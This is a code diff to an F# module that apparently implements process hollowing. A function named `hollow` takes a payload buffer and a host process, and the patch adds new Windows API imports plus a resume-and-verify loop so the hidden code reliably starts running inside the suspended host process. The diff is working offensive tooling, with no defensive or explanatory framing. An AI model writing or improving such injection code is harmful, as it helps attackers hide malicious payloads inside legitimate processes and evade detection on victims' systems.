@@ -28,8 +28,14 @@ module Native =
     [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
     extern uint32 ResumeThread(nativeint h)
 
+    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
+    extern uint32 SuspendThread(nativeint h)
+
     [<DllImport("kernel32.dll")>]
     extern nativeint GetCurrentProcess()
+
+    [<DllImport("kernel32.dll")>]
+    extern uint32 GetCurrentProcessId()
 
     [<DllImport("advapi32.dll", SetLastError = true, ExactSpelling = true)>]
     extern bool OpenProcessToken(nativeint h, uint32 acc, nativeint& tok)
@@ -226,10 +232,31 @@ let hollow (buffer: byte[]) (host: string) : bool =
                                         Native.CloseHandle(hProcess) |> ignore
                                         nope "resume" e
                                     else
-                                        hollowPid <- dwPid
-                                        Native.CloseHandle(hThread) |> ignore
-                                        Native.CloseHandle(hProcess) |> ignore
-                                        true
+                                        Threading.Thread.Sleep(1200)
+                                        let mutable running = false
+                                        let mutable guard = 0
+                                        while not running && guard < 8 do
+                                            guard <- guard + 1
+                                            let r = Native.ResumeThread(hThread)
+                                            if r = 0xFFFFFFFFu then guard <- 8
+                                            elif r <= 1u then running <- true
+                                            else Threading.Thread.Sleep(300)
+                                        if running then
+                                            let s = Native.SuspendThread(hThread)
+                                            if s = 0xFFFFFFFFu then running <- false
+                                            else
+                                                Native.ResumeThread(hThread) |> ignore
+                                                running <- s = 0u
+                                        if not running then
+                                            let e = Marshal.GetLastWin32Error()
+                                            Native.CloseHandle(hThread) |> ignore
+                                            Native.CloseHandle(hProcess) |> ignore
+                                            nope "resume" e
+                                        else
+                                            hollowPid <- dwPid
+                                            Native.CloseHandle(hThread) |> ignore
+                                            Native.CloseHandle(hProcess) |> ignore
+                                            true
                 finally
                     gsi.Free()
                     gpi.Free()
